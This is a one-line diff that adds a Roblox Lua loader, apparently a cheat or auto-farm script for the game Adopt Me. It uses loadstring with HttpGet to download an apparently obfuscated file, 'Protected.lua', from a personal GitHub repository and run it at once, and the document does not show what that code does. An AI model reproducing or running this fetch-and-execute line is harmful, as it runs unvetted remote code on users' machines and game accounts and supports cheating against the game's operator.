@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/urmomjklol69/Adopt-Me-Gingerbread-Farm/main/Protected.lua", true))()
